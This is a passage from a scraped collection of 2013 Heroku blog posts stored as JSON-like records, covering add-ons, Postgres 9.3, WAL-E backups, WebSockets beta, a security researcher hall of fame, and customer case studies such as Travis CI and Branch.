TempoDB, Pingdom, and Datadog. Users of the New Relic , Librato , or TempoDB Heroku add-ons can integrate immediately - just paste a few API keys and you’re ready to go. Finally, display a running log of incidents for historical visibility. For notifications during critical incidents, events and outages, customers can subscribe via email, RSS, SMS, or webhooks, ensuring they’re informed when it matters most. Just run heroku addons:add statuspage to get the add-on. It's in public beta, which means it is available for use to any Heroku user, but some changes may be made before it goes into GA. While in public beta, StatusPage is free to get started with. Find out more about using it in our Dev Center . Want to try more add-ons? The Heroku Add-Ons Marketplace makes it easy to add technologies you love to your Heroku app. We have add-ons for logging, caching, persistence and many other categories, all available as fully-managed services that you can add and scale in a single command.", "date": "2013-08-14,"},
{"website": "Heroku", "title": "Building Twelve Factor Apps on Heroku", "author": ["Ryan Daigle"], "link": "https://blog.heroku.com/twelve-factor-apps", "abstract": "Building Twelve Factor Apps on Heroku Posted by Ryan Daigle August 15, 2013 Listen to this article At Heroku, we’ve had the privilege of running and managing millions of amazing apps built by our users. Over a year ago, Heroku co-founder Adam Wiggins published the Twelve Factor App , based directly on these experiences. It distills best practices for building modern cloud applications into a 12-factor methodology specifically designed to maximize developer productivity and application maintainability. Twelve Factor apps are built for agility and rapid deployment, enabling continuous delivery and reducing the time and cost for new developers to join a project. At the same time, they are architected to exploit the principles of modern cloud platforms while permitting maximum portability between them. Finally, they can scale up without significant changes to tooling, architecture or development practices. Because the Twelve Factor methodology is a core part of how successful apps are built on Heroku, it is now documented in our Dev Center . In this post, we review the aspects of Heroku that help you build apps based on these tenets. For instance, decomposing your app into a set of lightweight processes is a prerequisite for running on Heroku and is the embodiment of the Twelve Factor principle of executing the app \" as one or more stateless processes \". However, there are several other, subtler, factors that should also be considered when deploying to Heroku, or any modern distributed environment. For those not familiar with the original Twelve Factors, we'll summarize them here. For developers that are already familiar with the Twelve Factor methodology, we'll re-introduce them in the specific context of building and deploying to Heroku . During development Applications should be thought of as self-contained, self-describing and independent entities . In practice this means each application should declaratively define all dependencies without any reliance on existing system packages. Nor should it embed the location of any external dependencies in the app source, instead relying on such configuration to be specified in the runtime environment . Developers will immediately recognize their buildpack’s use of language-specific tools , such as Ruby's Bundler and Clojure's Leiningen, as providing the necessary level of dependency declaration and isolation here, and will be familiar with Heroku's heroku config:set CLI command used to update external dependencies without modifying the app's source code. Using modern language toolchains alongside the strict separation of code and config that the Heroku CLI and Add-ons program require ensures a portable application and provides a set of environment-independent practices that enable you to run in the same fashion locally as your app does in production. At runtime Apps on Heroku are subject to several runtime parameters that ensure the app can be efficiently run in a distributed environment and is resilient to adverse conditions. These are in-product manifestations of several best-practices in application operation. Consider the ephemeral filesystem which ensures a stateless runtime , or the fast process startup/shutdown requirements which result in an application whose runtime distribution can be quickly adjusted in response to underlying system deviations. One of the most visible and fundamental concepts of Heroku is that of the process model . By running your application as one or more lightweight processes, and not a monolithic executable, you can more granularly scale the app to match a diverse workload — a sort of in-app horizontal scaling. The Procfile , your app’s process manifest , informs the runtime of your app’s unique composition and tools like Foreman (locally) and the Heroku dyno manager (remotely on Heroku) manage its execution. When managing Beyond the automated runtime service provided by the Heroku platform, it must also be possible to execute user-initiated tasks against the app as well as see the app's runtime log output. In compliant applications, these management and visibility requirements are well supported on Heroku. To execute a one-off task , such as a database migration or arbitrary command via REPL, simply provision a one-off dyno . To see your app's log output, configure your app to log to stdout and its real-time log stream, aggregated across the distributed Heroku runtime, will be available via the CLI with heroku logs -t or in one of the many logging add-ons . Conclusion Heroku is not only a platform; it is also a set of practices that embody the right way to develop modern applications. Understanding and applying these practices when developing your app ensures the most resilient and performant experience on Heroku.", "date": "2013-08-15,"},
{"website": "Heroku", "title": "The Heroku Security Researcher Hall of Fame", "author": ["Tom Maher"], "link": "https://blog.heroku.com/heroku-security-researcher-hall-of-fame", "abstract": "The Heroku Security Researcher Hall of Fame Posted by Tom Maher August 26, 2013 Listen to this article Starting today, Heroku would like to publicly thank all the independent security researchers who have practiced responsible disclosure and helped us remediate issues. The Heroku Security Researcher Hall of Fame lists these researchers, along with the date of their initial report.  If you've found a new security issue on our platform, we'd love to hear from you . Our intent is for this list to be comprehensive, going back to our beginning.  If you’ve reported a vulnerability to us in the past, and you’re either not listed or you’d like your listing changed (e.g., typos, change a link) or removed entirely, just let us know. Ground Rules: Customer applications are ineligible for multiple reasons.  Very roughly, this means we don’t list reports for *.herokuapp.com, and aspiring researchers should look at *.heroku.com.  This isn’t an absolute rule, however.  Older customer applications (i.e., our deprecated “Bamboo” stack) are hosted in *.heroku.com.  If you do find a security vulnerability in another customer’s application, please do still let us know.  We’re happy to forward the report to the customer either with or without your contact information. Only one listing per vulnerability.  For duplicate reports, the first reporter wins.  If necessary, we’ll check the timestamps. Only one listing per reporter.  For researchers kind enough to report multiple issues, we’re still figuring out how best to honor their contributions. Heroku and Salesforce employees will not be listed in the Hall of Fame. The decision to list a researcher in the Hall of Fame is made at the sole discretion of the Heroku Security Team. We don’t offer cash rewards, but we can link to your personal or professional site, and we’ll mail you a stylish Heroku t-shirt. Again, thank you for helping make the world safer. -Tom Maher Heroku Security Team", "date": "2013-08-26,"},
{"website": "Heroku", "title": "Heroku Postgres at Postgres Open and PostgreSQL Conf EU", "author": ["Shanley Kane"], "link": "https://blog.heroku.com/upcoming-heroku-postgres-conferences", "abstract": "Heroku Postgres at Postgres Open and PostgreSQL Conf EU Posted by Shanley Kane August 27, 2013 Listen to this article The Heroku Postgres team is hitting the road in coming months and we’d love to connect with you. If you’d like to meet up with us at any of the events below, drop us a line or Tweet us @HerokuPostgres . The first opportunity to connect with us is in September at Postgres Open . If you’ve already got your tickets for Postgres Open, join us for drinks and/or pizza at Clark Ale House on Tuesday, September 17, and make sure to check out talks by Craig Kerstiens and Peter Geoghegan . If you don’t already have your ticket for Postgres Open, but are interested in going, we’ve got a chance for you to win a ticket from us for free. Win A Ticket to Postgres Open We’re giving away 3 tickets to PG Open. For your chance to win a ticket, we want to see the creative ways you’re using dataclips with your Heroku Postgres database. Submissions can be a really impressive query or a great integration. The key to either is that it should be empowering you to better run your business with data. To enter: 1. Create your dataclip or integration 2. Submit the following to postgres@heroku.com : Your name Your role Your organization and what the company does A link to the dataclip or integration you’ve built We will be announcing winners on August 29, 2013. The winners will be chosen at the sole discretion of the Heroku Postgres team. PostgreSQL Conf EU Those of you in Europe will have an opportunity to connect with the team as well. A large part of the team will be at PG Conf EU. Make sure to attend talks by four of our team members: Concurrency in Postgres Visualizing Postgres Wiretapping the Wire Protocol: automatic data visualization for psql with Cartographer and FEMEBE Postgres what they really use Conclusion If you’re going to be at either of the above conferences, we’d love to talk to you. However, you don’t have to wait. If you ever have operational issues with your database, you can find help at help.heroku.com , or for product related questions and feedback you can contact us at postgres@heroku.com . Cross-posted from the Heroku Postgres blog , where you can keep up with the latest Heroku Postgres news.", "date": "2013-08-27,"},
{"website": "Heroku", "title": "Win a ticket to Postgres Open and visit us there", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/win_a_ticket_to_postgres_open", "abstract": "Win a ticket to Postgres Open and visit us there Posted by Craig Kerstiens August 26, 2013 Listen to this article The Heroku Postgres team is hitting the road in coming months and we'd love to connect with you. If you'd like to connect with us at any of the events below drop us a line postgres@heroku.com or @HerokuPostgres Postgres Open The first opportunity to connect with us is in September at Postgres Open . If you've already got your tickets for Postgres Open join us for drinks and/or pizza at Clark Ale House on Tuesday September 17, and make sure to check out talks by me and Peter Geoghegan at the conference. If you don't already have your ticket for Postgres Open but are interested in going, we've got a chance for you to win a ticket from us for free. Win a ticket to Postgres Open We're giving away 3 tickets to PG Open. For your chance to win a ticket we want to see the creative ways you're using dataclips with your Heroku Postgres database. Submissions can be a really impressive query or a great integration, the key to either is that it should be empowering you to better run your business with this data. To enter 1. create your dataclip or integration then 2. submit the following to postgres@heroku.com : Your name Your role Your organization and what the company does A link to the dataclip or to the integration that you've built. We will be announcing winners on August 29, 2013. The winners will be chosen at the sole discretion of the Heroku Postgres team. PostgreSQL Conf EU Those of you in Europe will have an opportunity to connect with the team as well. A large part of the team will be at PG Conf EU, including talks by 4 of our team members: Concurrency in Postgres Visualizing Postgres Wiretapping the Wire Protocol: automatic data visualization for psql with Cartographer and FEMEBE Postgres what they really use Conclusion If you're going to be at either of the above conferences we'd love to talk to you. However, you don't have to wait until these conferences, if you ever have operational issues with you database you can find help at help.heroku.com or for product related questions and feedback you can contact us at postgres@heroku.com postgres", "date": "2013-08-26,"},
{"website": "Heroku", "title": "How Travis CI Uses Heroku to Scale Their Platform", "author": ["Shanley Kane"], "link": "https://blog.heroku.com/how-travis-ci-uses-heroku", "abstract": "How Travis CI Uses Heroku to Scale Their Platform Posted by Shanley Kane September 03, 2013 Listen to this article Editor's note: This is a guest post from Mathias Meyer of Travis CI. Travis CI is a continuous integration and deployment platform. It started out as a project to offer a free platform for the open source community to run their tests and builds on. Over the past two years, Travis CI has grown, a lot. What started out with a single server running just a few hundred tests a day turned into a platform used by thousands of open source projects and hundreds of companies for their public and private projects. Travis CI is currently serving more than 62,000 active open source projects, with 32,000 daily builds, and 3,000 private projects with 11,000 daily builds. Heroku is an important part of how we’ve scaled our platform, and this is the story of how we did it. Evolving our Architecture Travis CI started out as a very simple application. A web front-end accepted commit notifications from GitHub, turned them into builds, and pushed them on a queue. A background process scheduled the builds and processed the build logs and build results. It was aptly called hub. That application has run on Heroku since the beginning of Travis CI. Right from the start, streaming logs live to the web browser was an integral part of Travis CI, making up one of the bigger datastreams that the hub has to process. It also turned into one of the things that were hardest to scale out. As we added pull request testing as one of our major features, our usage exploded, and we started seeing things break in the oddest ways, leading to a couple of outages and learnings on how we needed to improve our architecture. An important lesson was that the big monolithic process called hub couldn't keep up with the load anymore. In retrospect, it’s amazing how much it was able to process on its own. Apps, Apps Everywhere! We started breaking up the hub into lots of little pieces, responsible for very specific parts of what the previous monolithic implementation used to do. Heroku allowed us to quickly iterate on breaking out new applications and deploying them as new Heroku apps. To date, a total of eight different apps now make up Travis CI. Our applications are split by responsibility: listener accepts notifications from GitHub and places them on a Sidekiq queue (which uses the RedisGreen Heroku add-on underneath). gatekeeper turns these requests into build skeletons in our database. It's also responsible for synchronizing user data with GitHub so we're always up-to-date with what repositories a user has access to. hub schedules the builds and processes the build results. tasks sends out notifications via email, Campfire, HipChat, IRC and webhooks. logs processes chunks from the build logs coming in from the workers. We're using a mix of CloudAMQP and the RabbitMQ Bigwig add-ons. Both have provided great throughput and stability for our service. api serves data to the web front-end and to our command-line client. The hub is now only responsible for scheduling builds and processing their end results, a very narrow set of tasks compared to before the re-write. With our monolithic app broken up into smaller, more efficient and scalable pieces, we could address other growth issues. Travis CI is busy running builds all day, but usage goes up as the US West Coast wakes up. To handle these spikes, and to handle our increasing demands for capacity, we needed the ability to scale up processes easily, in particular our API and our logs processing. As we solved one of our biggest scaling challenges , Heroku's dynos made it very easy for us to grow with demand - especially with the recent addition of 2x dynos with more memory (JRuby 1.7 running on JDK 1.7 has higher baseline memory requirements). JRuby All the Way Down Very early on we needed to make sure that our service could process lots of things in parallel. With the standard Ruby implementation putting tight restrictions on how many things we could run concurrently, JRuby and the JVM offered a path to greater parallelization. Thanks to Heroku we were able to easily switch to JRuby very early on. In fact, we started using it around two years ago, and we were one of the earliest users of JRuby on Heroku's platform. The JVM, JRuby and Celluloid in particular have given us the means to scale out several parts of our infrastructure much more easily than we could've done with standard Ruby. We did have a fair share of problems with it initially, in particular handling timeouts in JRuby 1.6, debugging processes during runtime, and encoding, but all of these have been solved. Fixes were available to us quickly thanks to the JRuby team and Heroku's continuous updates of the Ruby buildpacks. The Hidden Heroku Gem: Heroku Postgres The Heroku service that doesn't get enough attention is Heroku Postgres . We've been running on production instances for a long time now, and thanks to the easy ways of creating followers and forks of running databases, we've been able to upgrade on the go to meet our ever increasing needs. Travis CI is currently running on a Fugu instance, which offers 3.75GB RAM and 1TB of storage. Thanks to the follower feature , we have been able to upgrade our database as we grow without significant downtime . We throw a decent amount of writes at it, and we process up to 200 messages per second, the vast majority of which represent chunks of build logs directly stored in the database. We keep hammering our Postgres instance with a ton of writes every minute, every hour, every day. It keeps on performing very well. However, we’re continuing work to make our setup more resilient to failure. For starters, we’re looking into moving parts of our data - log chunks in particular - to a separate Postgres instance to make sure we can serve the ever-increasing read traffic coming from our API. Splitting out log storage to a separate database will be an important step to not only reducing the load on our main database, it will also help us ensure better availability and redundancy. We're currently running on PostgreSQL 9.0 (travis-ci.org) and 9.1 (travis-ci.com). One of the main reason we want to upgrade to 9.2 on Heroku is that monitoring and gathering metrics has improved significantly in that version. We're working on purging out data that can be stored elsewhere, build logs for example, so we can approach the upgrade eventually without incurring significant downtime. Conclusion All in all, we've had a great experience scaling out Travis CI on Heroku's platform. We're very thankful for their support as a sponsor of our open source platform and to have them as a customer, and we consider ourselves happy customers of the great services Heroku provides. We’re also excited to continue to support the community of people using Heroku and Travis CI together. To find out how to use Travis CI to test and deploy on Heroku, get started here .", "date": "2013-09-03,"},
{"website": "Heroku", "title": "How SpaceGlasses Builds the Future with Heroku", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/how-spaceglasses-builds-the-future-with-heroku", "abstract": "How SpaceGlasses Builds the Future with Heroku Posted by Sara Dornsife September 19, 2013 Listen to this article Editor's note: This is a guest post from Michael Buckbee of Meta/SpaceGlasses. SpaceGlasses are augmented reality glasses that actually work. They let people control systems with a gesture, see virtual objects on top of the real world and create technology that would make Tony Stark proud. Prior to joining Meta, I had developed and managed a number of high traffic Rails sites. I was brought on to help move the company’s website from a single static launch page to being an e-commerce platform and to help lay the groundwork for the company’s app store. We chose to build on top of Heroku as we are moving very quickly, need to have a lots of flexibility and don’t have the time or budget to provision our own infrastructure from scratch. As the site’s traffic has rapidly grown from tens of thousands to hundreds of thousands of visitors a day being on Heroku has only made more sense. Beyond just manually tweaking the number of web dynos that were running we were able to take advantage of a number of other Heroku add-ons and services to great effect: 1. Memcache as a Service One of the first steps we took was to start caching everything possible in Memcached, facilitated by the Memcachier Add-on . We started by using Rails built in Action Caching to reduce the load that underlying Unicorn servers running inside the dynos needed to function. On several pages with heavy database interaction results were cached separately. However, one of the somewhat biggest wins for us was using Memcached as a buffer to keep near real time order information from our e-commerce provider readily available. 2. Sysadmin in a Box Being the sole full time web-developer on the project (all the other software and electrical engineers are working feverishly making the actual glasses), it was tremendously valuable for us to be able to scale at whim. While I certainly could have taken the time to setup HAProxy and SSL, and a series of AppServers and Postgres, having Heroku available was like having an on-demand sysadmin available 24 hours a day. 3. Scaling as a Service Early on, we had added the AdeptScale service to our production Heroku stack. AdeptScale dynamically increases the number of running web dynos in relation to response time metrics. If response times increase, more and more dynos are added. We continuously monitor the site and were surprised one day to find that 30 dynos had been spun up. Turning to Google Analytics we were a little flabbergasted to realize that we had climbed up to comfortably handling 3000 active visitors to the site without even realizing it. Some investigation turned up that we had become a major topic of conversation on 4Chan that day. The 120,000 visitors that came to the site over the next 24 hours from 4Chan were a mix of the genuinely curious, aggressively hostile and quite a few with a real vision of the future. All of which we sailed through because of AdeptScale and Heroku. Building The Future Heroku has been a lifesaver in allowing us to book hundreds of thousands of dollars of sales we would have otherwise lost out on due to downtime. As we start launching new services and products it’s a huge comfort to know we just don’t have to worry about our hosting or our ability to handle the future.", "date": "2013-09-19,"},
{"website": "Heroku", "title": "Introducing Postgres 9.3", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/postgres_93_now_available", "abstract": "Introducing Postgres 9.3 Posted by Craig Kerstiens September 09, 2013 Listen to this article As of today PostgreSQL 9.3 is available on Heroku Postgres as a public beta. This new version of Postgres brings you even more useful features so you can be as powerful as ever. Whether its richer JSON functionality , materialized views , or richer join support in lateral joins this version has a little something for everyone. Provision your Postgres 9.3 database by running heroku addons:add heroku-postgresql:crane --version=9.3 and get started working with it today, or check out some of our favorite features included in this new version below. Foreign Tables Foreign data wrappers (FDWs), which allow you to query from within Postgres to an external datasource, have been available for a couple of releases. Now Postgres ships with a built-in Postgres FDW as an extension . With the Postgres FDW aggregating and reporting against your data from disparate Heroku Postgres databases is as simple as CREATE EXTENSION postgres_fdw , followed by setting up your foreign tables. Beyond the built in Postgres FDW available to all Heroku Postgres 9.3 users today, the API for foreign data wrappers now supports them writing as well as reading data. This lays the groundwork for more powerful wrappers to be built which in the future will enable Postgres to be a fully federated database. We’ve already begun taking advantage of foreign data wrappers internally at Heroku for reporting and look forward to hearing how you take advantage of them yourselves. A more powerful JSON With version 9.2 we saw PostgreSQL get support for JSON starting on its path of bridging the gap between the dynamics of schemaless databases and the robustness of the traditional relational world. This support got even richer by our addition of full Javascript support with the V8 engine inside Postgres. It continues to get even better today with more built in functions and operators to make working with your JSON data even easier. Materialized Views For many applications, pre-computing expensive queries can be\na great way to improve overall performance. Materialized views do\njust this by caching the results of a view and then allowing you\nto periodically refresh those results. This can be tremendously useful, and the in-progress Postgres\n9.4 development already has some exciting improvements . And more There are a number of less prominent additions and fixes, ranging\nfrom performance improvements, to more flexible DDL\ncommands (e.g., CREATE SCHEMA ... IF NOT EXISTS ), to event\ntriggers for better tooling hooks. There have been over 1700 commits\nsince 9.3 development started in earnest here: commit bed88fceac04042f0105eb22a018a4f91d64400d\nAuthor: Tom Lane <tgl@sss.pgh.pa.us>\nDate:   Wed Jun 13 20:03:02 2012 -0400\n\n    Stamp HEAD as 9.3devel.\n\n    Let the hacking begin ... You can read further on whats new over at the PostgreSQL wiki . Beta status As Postgres moves from 9.3 beta releases to a 9.3.0 GA release,\nwe are moving out support for this version from alpha to beta.\nAs it is still a beta product, it comes with several conditions: Existing 9.3 beta databases must be upgraded to 9.3.0 via\npgbackups .\nFollowers and forks of 9.3 beta are no longer supported. Heroku Postgres uptimes are expected uptime guidelines and not\na guarantee or SLA for uptime of your production database. As\nwith many alpha or beta features the expected uptime is lower\nfor Postgres 9.3. Forks, followers, and other functionality may see a higher\nlevel of issues during the beta. Please let us know about any\nproblems you run into. Conclusion Postgres 9.3 continues the tradition of adding great features,\nperformance improvements, and maintaining a serious concern for\ndata integrity. Get started by provisioning your Postgres 9.3\ndatabase: $ heroku addons:add heroku-postgresql:crane --version 9.3 Since this is a beta offering, we are especially interested in\nhearing your feedback. Please let us know what you think and how you're using it by contacting us at postgres@heroku.com . postgres", "date": "2013-09-09,"},
{"website": "Heroku", "title": "WAL-E and Continuous Protection with Heroku Postgres", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/wal_e_and_continuous_protection_with_heroku_postgres", "abstract": "WAL-E and Continuous Protection with Heroku Postgres Posted by Craig Kerstiens September 26, 2013 Listen to this article Heroku Postgres is Heroku’s database-as-a-service product. With Heroku Postgres, you can easily provision and scale a Postgres database for your Heroku application, or as a stand-alone service. Recently, we’ve blogged about PostgreSQL 9.3 on Heroku and how you can use Heroku Postgres dataclips to build awesome business dashboards with your data. In this post, we talk about how Heroku Postgres delivers continuous protection for your business data using WAL-E, an open source application for archiving PostgreSQL WAL (Write Ahead Log) files quickly, continuously and with a low operational burden. About Continuous Protection In order to protect customer data and be resilient to failure modes, we provide all Heroku Postgres databases with continuous protection by replicating data to external storage. We store a base backup of your database as well as a log of all committed transactions in the form of WAL files - the standard method for ensuring data durability in Postgres. This means we can restore your database by fetching the base backup and replaying all of the WAL files on a fresh install in the event of hardware failure, data corruption or other failure modes. In addition to providing recovery functionality, this methodology lets us expose Heroku Postgres features that make working with your database faster and more flexible. The same mechanism underlies our fork feature , which lets you immediately create a perfect, byte-for-byte clone of your database for easier database migrations, load testing, and creation of development databases. It’s also how we let you spin up followers - read-only replicas of your database you can use for scaling reads, manual failovers and business reporting with no impact to production. These features are used far more often than restoring for disaster recovery, with the added benefit that they’ve let us battle-test the shared underlying mechanism so we can ensure success when disaster does hit. For more information on continuous protection on Heroku, check out the Dev Center article . Introducing WAL-E In addition to using tons of open source software here at Heroku, we are also serious and passionate about contributing code back to the community. WAL-E is one such open-source project that performs continuous, automatic archiving of WAL files to S3 across our entire fleet of databases. Initially developed by our resident tuple groomer Daniel Farina , you can now find it on GitHub . WAL-E is quickly becoming the default option for those running PostgreSQL on top of Amazon Web Services, with companies like Instagram using it to perform point-in-time restorations and quickly bootstrap a new read-replica or failover slave and Amazon themselves recommending it . We wrote the initial version of WAL-E because we needed a programmatic, efficient way to ensure the safety of databases at scale across our entire user base. One of the major requirements was that the software would be easy to set up and administrate - as a result, WAL-E users can generally get up and running in about 15 minutes. In fact, WAL-E only has four operators: backup-fetch and backup-push , which retrieve and send, respectively, base backups ; and wal-fetch and wal-push , which send and retrieve the WAL files themselves. If you use Heroku Postgres, WAL-E is already hard at work for you as the underlying mechanisms for fast and easy disaster recovery, forks, and followers. Those using WAL-E for a private Postgres installation can set it up to archive logs from every few minutes to once a day, depending on their business needs. Future of WAL-E WAL-E is at the heart of our continuous protection we provide for our customers, and will be around for some time to come. We actively maintain WAL-E and accept pull requests, issues and feedback on GitHub and on the mailing list . If you’re interested in contributing we’d love to hear from you. For more on Heroku Postgres and continuous protection, check out the Dev Center article, which also talks about logical backup options with Heroku Postgres. Special Thanks Finally we want to offer a special thanks to contributors of WAL-E to date: Bo Shi Christian Pedersen Daniel Farina Edward Muller Kirill Klenov Maciek Sakrejda Michael Hale Mike Krieger Russ Garrett Ryan Kelly Timothée Peignier Toby Collier Tuomas Silen", "date": "2013-09-26,"},
{"website": "Heroku", "title": "Extended Validation SSL Certificates on Heroku", "author": ["Tom Maher"], "link": "https://blog.heroku.com/fancy-pants-certs", "abstract": "Extended Validation SSL Certificates on Heroku Posted by Tom Maher October 07, 2013 Listen to this article Heroku is now using Extended Validation SSL Certificates for most of our Heroku-owned applications. This allows you to tell at a glance if an URL belongs to Heroku itself, or is merely hosted on us. Applications in our legacy “Bamboo” stack are hosted under the heroku.com DNS domain, which has historically made it difficult for people to differentiate between Heroku-owned apps (e.g., id.heroku.com, dashboard.heroku.com) and customer applications. We believe the extra UI indication will prove useful in solving this problem. For more information, see \"EV SSL Certificates and Heroku-owned Applications\" on Heroku Dev Center . -Tom Maher Heroku Security Team", "date": "2013-10-07,"},
{"website": "Heroku", "title": "WebSockets Now in Public Beta ", "author": ["Jake Vorreuter"], "link": "https://blog.heroku.com/websockets-public-beta", "abstract": "WebSockets Now in Public Beta Posted by Jake Vorreuter October 08, 2013 Listen to this article We’re excited to announce that WebSocket functionality is now available on Heroku in public beta. We can’t wait to see the powerful and creative real-time apps you’ll build. In this post, we show how to get up and running with WebSockets and demonstrate the functionality with two sample apps you can get on GitHub. Editor's Note: WebSockets support is now Generally Available . The heroku labs:enable websockets command is no longer required for the example app below. Getting Started For full documentation of WebSocket support on Heroku, visit the Dev Center . WebSocket functionality is available as part of Heroku Labs. First make sure you have the Heroku Toolbelt installed. Then enable the WebSocket feature: $ heroku labs:enable websockets -a myapp\nEnabling websockets for myapp... done\nWARNING: This feature is experimental and may change or be removed without notice.\nFor more information see: https://devcenter.heroku.com/articles/heroku-labs-websockets Congratulations, you’re now ready to build and deploy real-time apps on Heroku leveraging WebSockets. Have feedback or run into issues? Let us know in the Heroku Forums . Please note: When the websockets labs feature is enabled for your app, the DNS record for your herokuapp.com domain is updated to point at a WebSocket-capable endpoint . However, once WebSocket functionality leaves public beta, all apps and endpoints will support WebSocket functionality automatically. Example WebSocket Apps It’s easy to get up and running experimenting with WebSockets on Heroku.  Two very simple sample apps are available for you to clone and deploy on Heroku: A Node.js app using the ws WebSocket implementation and a Ruby app using the faye WebSocket implementation. This is all it takes to get the Node.js WebSocket app running on Heroku: $ git clone git@github.com:heroku-examples/node-ws-test.git\nCloning into 'node-ws-test'... $ cd node-ws-test $ heroku create\nCreating fathomless-hamlet-4092... done\nhttp://fathomless-hamlet-4092.herokuapp.com/ | git@heroku.com:fathomless-hamlet-4092.git\nGit remote heroku added $ heroku labs:enable websockets\nEnabling websockets for fathomless-hamlet-4092... done\nWARNING: This feature is experimental and may change or be removed without notice.\nFor more information see: https://devcenter.heroku.com/articles/heroku-labs-websockets $ git push heroku master\nCounting objects: 12, done.\n...\n-----> Node.js app detected\n...\n-----> Launching... done, v4\n       http://fathomless-hamlet-4092.herokuapp.com deployed to Heroku $ heroku open\nOpening fathomless-hamlet-4092... done You should see an auto-updating list of timestamps in your browser.  The timestamp value is captured on the server side (your dyno) and sent via a WebSocket connection to the client.  Client-side JavaScript running in your browser updates the DOM every time a new value is received.  This is a very simple example meant to demonstrate the most basic WebSocket functionality. Next we’ll look at a more interesting example of what you can build with WebSockets. WebSocket Geolocation App The map below uses WebSockets and the browser Geolocation API to plot a point for every client currently viewing this post. The Node.js app powering this map is open-source and available on GitHub at heroku-examples/geosockets . Note: If you do not see your location on the map, your browser may be configured to block location services. The geosockets app was designed with horizontal scalability in mind. The shared location dataset is stored in a redis datastore and each web dyno connects to this shared resource to pull the complete list of pins to place on the map. Clients viewing the map each establish their own WebSocket connection to any one of the backend web dynos and receive real-time updates as locations are added and removed from the redis datastore. Further Reading Hopefully this gives you an idea of some of the potential applications of this technology.  Additional examples and resources can be found in the Dev Center and if you have feedback or run into issues, please let us know in the Heroku Forums .", "date": "2013-10-08,"},
{"website": "Heroku", "title": "How Branch Uses Heroku", "author": ["Katie Boysen"], "link": "https://blog.heroku.com/how-branch-uses-heroku", "abstract": "How Branch Uses Heroku Posted by Katie Boysen October 21, 2013 Listen to this article Editor's Note: This is a guest post from Hursh Agrawal , co-founder of Branch . At Branch, we’ve been through several feature launches on Branch.com and, more recently, several more on our new site, Potluck . Although it becomes easier, building high-quality, high-traffic web applications still isn’t easy. Here are a few things we’ve learned about hosting our apps on Heroku that have helped keep our latency down and our confidence up. Building on Heroku One thing that has been consistently helpful is not hosting services ourselves. Heroku provides a pretty extensive Add-on Marketplace you can use to get most services you’d need up and running in a matter of minutes. At Branch, we use Redis pretty extensively both for caching and for all the feeds across our sites. We started off by running our own Redis server on EC2, but after a few months of constantly worrying about what we’d do for failover and how best to persist our Redis data, we decided to switch to using OpenRedis. Since then, we focused on building great social apps instead of getting into the business of hosting databases. It gives us one less thing to worry about as we’re trying to iterate on our product. (There is a caveat to this — it’s sometimes difficult to find well-priced, easy to use, and reliable third-party providers for certain technologies. When looking for a new service, we usually scour the Heroku Add-ons page and try out each vendor on a free plan before deciding which to go with.) For us, the biggest advantage of using SaaSs for various services has been having access to customer support. When we hosted our own Redis or Postgres boxs, we had nobody we could call up and nag about how best to use the software or how to fix obscure bugs. When you’re paying for service, you also get consultants (within reason) for free. This has been enormously helpful when facing weird bugs or just wanting advice on how best to optimize our setup. Heroku Postgres Along with Redis and Elasticsearch, our main persistence mechanism at Branch is Postgres. We love Postgres, and Heroku’s Postgres service has been phenomenal at both keeping our boxes up and running well, and at providing features and advice to allow us to do our jobs as well as possible. When building a webapp with any complexity, you quickly realize that architecting the DB correctly becomes important in the fight against slow response times. A few tools have been really helpful to us when lowering our Postgres usage and query times. Using the slow query log — You can access your PG logs from the command line with heroku logs —tail —ps postgres —app APP_NAME I still haven’t gotten it to give me historical data, but it shows slow queries that are happening right now. Leave the window open for a few minutes on any Postgres instance with moderate to high traffic and you’ll start to see slow queries show up. This is great for figuring out what’s unindexed or just plain gnarly. Dataclips — Dataclips are SQL queries you can save and pull up anytime via the Heroku Postgres web GUI. These are great for diagnostic queries like queries to Postgres’s inbuilt pg_stat_user_tables table. One we use pretty often is select relname as \"table\", seq_scan as \"non-index lookups\", seq_tup_read as \"tuples scanned\", idx_scan as \"index lookups\", idx_tup_fetch as \"tuples scanned via index\" from pg_stat_user_tables; This shows how many index scans vs non-index scans Postgres is doing on each table and how bad those table scans are (by showing how much data Postgres has to scan through to fulfill those non-indexed queries). This is great for diagnosing which tables are getting hit most often with complex queries or don’t have indexes. pg-extras — Heroku also has a CLI interface for getting diagnostic data out of your Postgres instance here . This is great for figuring out your cache and index hit rate (both of which ideally should be above 0.99), index sizes, and other info for tuning Postgres instance. Launching with Heroku After so many launches, we’ve also learned a lot about how to stay calm and get through a launch successfully. You can find some of our more general learnings here , but a lot of what we’ve learned about using Heroku has been around simplicity and not over-optimizing. During our first Branch.com launch, we obsessed over having the right amount of dynos up for any situation. We implemented an auto-scaling dyno algorithm to make sure we’d never be caught with our pants down. This turned out to be a horrible idea. When some of our workers went haywire and started sending thousands of emails to a few users because of an obscure Rails bug, we couldn’t scale them down to 0 because the algorithm would just scale them back up. We had to have an engineer sit and type in heroku ps:scale worker=0 every 3 seconds (sorry, Heroku!) until someone else debugged and fixed the problem. Now we just scale the dynos up above what we think we’ll need and leave them until we see some latency. It’s manual and not very scientific, and probably costs us a bit extra, but it’s way simpler than our other solutions, and trying to optimize this just wasn’t worth complexity. Likewise, we used to fixate on analytics. We use New Relic for measuring app latency, and it’s been fantastic for when we need to troubleshoot issues or figure out where a user’s time is going. After each of our launches, we generally saw latency spikes as portions of the app are tested with actual load. One of the worst things we did on our first launch, though, is to keep the latency graph up for everyone to see all day. It caused a lot of stress and, as random latency spikes showed up now and then, a lot of our time and energy went into watching and worrying about the graphs instead of fixing bugs and pushing out new features. Intermittent latency spikes are inevitable in new applications, and often, the time spent fixing them can be spent fixing other, more pressing issues. Heroku has been fantastic for building and launching apps quickly and relatively painlessly. Learning about and using all the features Heroku and Heroku Postgres provide has been great for our productivity and has been invaluable in keeping our turnaround time low and keeping us shipping fast.", "date": "2013-10-21,"},
